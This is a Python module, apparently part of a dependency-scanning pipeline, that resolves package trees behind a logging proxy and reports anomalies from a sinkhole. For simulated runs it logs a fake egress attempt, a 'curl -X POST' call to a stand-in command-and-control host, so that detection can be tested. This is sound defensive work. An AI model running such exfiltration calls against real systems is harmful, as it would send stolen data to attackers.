import hashlib
import json
from typing import Dict, Any
from ..proxy.egress_proxy import EgressProxy
from ..proxy.sinkhole import SinkholeLogger

def run_stage2_resolve(run_id: str, source_sha256: str, parameters: Dict[str, Any]) -> Dict[str, Any]:
    """Runs dependency resolution behind logging allowlist proxy with hook observation."""
    proxy = EgressProxy()
    sinkhole = SinkholeLogger()

    # Check simulated or parameter-driven hook observation
    simulated_hooks = parameters.get("simulate_hook_egress", False)
    if simulated_hooks:
        sinkhole.log_egress_attempt("evil-c2-collector.attacker.com", 443, "curl -X POST evil-c2-collector")

    raw_tree = json.dumps({
        "run_id": run_id,
        "source_sha256": source_sha256,
        "resolved_trees": parameters.get("resolved_trees", ["maven", "npm", "pypi"]),
    }, sort_keys=True)
    tree_sha256 = hashlib.sha256(raw_tree.encode("utf-8")).hexdigest()

    sinkhole_json, sinkhole_sha256 = sinkhole.export_evidence_artifact()

    return {
        "status": "success",
        "tree_artifact_sha256": tree_sha256,
        "sinkhole_logs_artifact_sha256": sinkhole_sha256,
        "sinkhole_logs": sinkhole_json,
        "hook_anomalies_detected": sinkhole.has_anomalies(),
        "metrics": {
            "proxy_requests": len(proxy.get_logs()),
            "anomalies_count": len(sinkhole.sinkhole_events)
        }
    }
